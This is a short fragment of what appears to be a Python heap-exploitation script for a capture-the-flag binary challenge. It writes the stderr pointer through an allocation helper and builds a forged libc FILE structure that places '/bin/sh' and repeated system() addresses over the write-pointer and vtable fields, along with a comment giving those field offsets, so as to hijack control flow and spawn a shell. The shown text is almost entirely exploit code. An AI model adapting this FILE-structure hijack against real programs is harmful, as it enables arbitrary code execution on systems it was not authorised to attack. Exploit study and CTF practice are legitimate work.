...
add(0xe0,b'a'*0x8+p64(stderr))
payload = b'/bin/sh\x00' + p64(0)*4 +p64(1) + p64(0)*4 + p64(system_addr)*4
# 0x28 writeptr_offset 0x20 writebase_offset 0xc0-->mode_offset 0xd8 vtable_offset
